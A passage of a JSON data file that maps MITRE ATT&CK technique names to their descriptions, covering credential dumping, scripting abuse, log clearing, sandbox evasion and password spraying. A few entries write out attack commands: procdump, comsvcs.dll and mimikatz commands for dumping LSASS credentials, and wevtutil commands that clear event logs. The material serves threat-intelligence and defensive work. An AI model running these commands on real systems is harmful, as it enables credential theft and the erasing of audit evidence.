DLL injection may also evade detection from security products since the execution is masked under a legitimate process. "
  ],
  "os credential dumping: lsass memory": [
    "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as comsvcs.dll can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n"
  ],
  "command and scripting interpreter: javascript": [
    "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)."
  ],
  "masquerading: masquerade task or service": [
    "Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description.(Citation: TechNet Schtasks)(Citation: Systemd Service Units) Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Fysbis Dr Web Analysis)"
  ],
  "indicator removal on host: clear windows event logs": [
    "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\nThe event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
  ],
  "obtain capabilities: tool": [
    "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries)."
  ],
  "system location discovery: system language discovery": [
    "Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)\n\nThere are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) \n\nFor example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelg\u00e4nging May 2018)\n\nOn a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable."
  ],
  "encrypted channel: symmetric cryptography": [
    "Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4."
  ],
  "lateral tool transfer": [
    "Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)\n\nFiles can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095)."
  ],
  "data encoding: standard encoding": [
    "Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip."
  ],
  "automated collection": [
    "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. \n\nThis technique may incorporate use of other techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) to identify resources in cloud environments."
  ],
  "web service: bidirectional communication": [
    "Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet. \n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection. "
  ],
  "system binary proxy execution: msiexec": [
    "Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.\n\nAdversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.(Citation: Microsoft AlwaysInstallElevated 2018)"
  ],
  "virtualization/sandbox evasion: time based evasion": [
    "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.\n\nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)\n\nBenign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)\n\nAdversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)"
  ],
  "acquire infrastructure: domains": [
    "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes, including for [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation: PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.(Citation: CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation: httrack_unhcr)(Citation: lazgroup_idn_phishing)\n\nAdversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation: Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)\n\nDomain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.(Citation: Mandiant APT1)"
  ],
  "data staged: local data staging": [
    "Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021)"
  ],
  "hide artifacts: hidden window": [
    "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nOn Windows, there are a variety of features in scripting languages in Windows, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>. (Citation: PowerShell About 2019)\n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.\n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)"
  ],
  "obfuscated files or information: steganography": [
    "Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.\n\n[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) \n\nBy the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  "
  ],
  "peripheral device discovery": [
    "Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions."
  ],
  "encrypted channel: asymmetric cryptography": [
    "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.\n\nFor efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002)."
  ],
  "valid accounts: domain accounts": [
    "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain."
  ],
  "disk wipe: disk content wipe": [
    "Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)"
  ],
  "command and scripting interpreter: python": [
    "Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.\n\nPython comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors."
  ],
  "virtualization/sandbox evasion": [
    "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)\n\nAdversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)\n\n"
  ],
  "access token manipulation: token impersonation/theft": [
    "Adversaries may duplicate then impersonate another user's token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using <code>DuplicateToken(Ex)</code>. The token can then be used with <code>ImpersonateLoggedOnUser</code> to allow the calling thread to impersonate a logged on user's security context, or with <code>SetThreadToken</code> to assign the impersonated token to a thread.\n\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system."
  ],
  "supply chain compromise: compromise software supply chain": [
    "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.\n\nTargeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.(Citation: Avast CCleaner3 2018)(Citation: Command Five SK 2011)  "
  ],
  "account discovery: local account": [
    "Adversaries may attempt to get a listing of local system accounts. This information can help adversaries determine which local accounts exist on a system to aid in follow-on behavior.\n\nCommands such as <code>net user</code> and <code>net localgroup</code> of the [Net](https://attack.mitre.org/software/S0039) utility and <code>id</code> and <code>groups</code>on macOS and Linux can list local users and groups. On Linux, local users can also be enumerated through the use of the <code>/etc/passwd</code> file. On macOS the <code>dscl . list /Users</code> command can be used to enumerate local accounts."
  ],
  "web service: dead drop resolver": [
    "Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed)."
  ],
  "data manipulation: transmitted data manipulation": [
    "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact."
  ],
  "archive collected data: archive via utility": [
    "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. On Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) Additionally, <code>xcopy</code> on Windows can copy files and directories with a variety of options.\n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)"
  ],
  "software discovery": [
    "Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nAdversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)."
  ],
  "non-application layer protocol": [
    "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications."
  ],
  "account discovery: domain account": [
    "Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups."
  ],
  "access token manipulation: create process with token": [
    "Adversaries may create a new process with a different token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)\n\nCreating processes with a different token may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used (ex: gathered via other means such as [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003))."
  ],
  "defacement: internal defacement": [
    "An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites, or directly to user systems with the replacement of the desktop wallpaper.(Citation: Novetta Blockbuster) Disturbing or offensive images may be used as a part of [Internal Defacement](https://attack.mitre.org/techniques/T1491/001) in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished.(Citation: Novetta Blockbuster Destructive Malware)"
  ],
  "brute force: password spraying": [
    "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. (Citation: BlackHillsInfosec Password Spraying)\n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625."
  ],
  "proxy: external proxy": [
    "Adversaries may use an external proxy to act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. (Citation: Trend Micro APT Attack Tools) Adversaries use these types of proxies to manage command and control communications, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths to avoid suspicion.\n\nExternal connection proxies are used to mask the destination of C2 traffic and are typically implemented with port redirectors. Compromised systems outside of the victim environment may be used for these purposes, as well as purchased infrastructure such as cloud-based resources or virtual private servers. Proxies may be chosen based on the low likelihood that a connection to them from a compromised system would be investigated. Victim systems would communicate directly with the external proxy on the Internet and then the proxy would forward communications to the C2 server."
  ],
  "exfiltration over web service: exfiltration to cloud storage": [
    "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. "
  ],
  "account manipulation": [
    "Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. \n\nIn order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain. However, account manipulation may also lead to privilege escalation where modifications grant access to additional roles, permissions, or higher-privileged [Valid Accounts](https://attack.mitre.org/techniques/T1078)."
  ],
  "file and directory permissions modification: windows file and directory permissions modification": [
    "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).(Citation: Microsoft DACL May 2018) Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.(Citation: Microsoft Access Control Lists May 2018)\n\nAdversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)."
  ],
  "remote services: vnc": [
